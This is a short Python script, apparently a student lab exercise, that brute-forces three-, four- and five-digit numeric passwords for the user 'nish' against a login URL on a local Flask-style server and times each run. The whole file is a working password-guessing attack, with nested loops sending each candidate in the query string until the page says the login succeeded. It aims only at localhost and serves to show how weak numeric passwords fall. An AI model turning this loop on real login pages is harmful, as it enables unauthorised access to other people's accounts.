# -*- coding: utf-8 -*-
"""
Created on Mon Dec 20 10:54:34 2021

@author: 19pt15
"""

import urllib 
import timeit

user = 'nish'



def three():
    for i in range(10):
        for j in range(10):
            for k in range(10):
                curr = str(i) + str(j) + str(k)
                p = 'http://127.0.0.1:5000/welcome?username=' + user + "&pass=" + curr
                page = urllib.request.urlopen(p)
                page_data = page.read().decode('utf-8')
                if page_data == "Youre' In!":
                    print("Password: ", curr)
                    return

def four():
    for i in range(10):
        for j in range(10):
            for k in range(10):
                for l in range(10):
                    curr = str(i) + str(j) + str(k) + str(l)
                    p = 'http://127.0.0.1:5000/welcome?username=' + user + "&pass=" + curr
                    page = urllib.request.urlopen(p)
                    page_data = page.read().decode('utf-8')
                    if page_data == "Youre' In!":
                        print("Password: ", curr)
                        return

def five():
    for i in range(10):
        for j in range(10):
            for k in range(10):
                for l in range(10):
                    for m in range(10):
                        curr = str(i) + str(j) + str(k) + str(l) + str(m)
                        p = 'http://127.0.0.1:5000/welcome?username=' + user + "&pass=" + curr
                        page = urllib.request.urlopen(p)
                        page_data = page.read().decode('utf-8')
                        #print(page_data)
                        if page_data == "Youre' In!":
                            print("Password: ", curr)
                            return



start = timeit.default_timer()
three()                
stop = timeit.default_timer()
print('Three Time: ', stop - start)  
start = timeit.default_timer()
four()                
stop = timeit.default_timer()
print('Four Time: ', stop - start)  
start = timeit.default_timer()
five()                
stop = timeit.default_timer()
print('Five Time: ', stop - start)  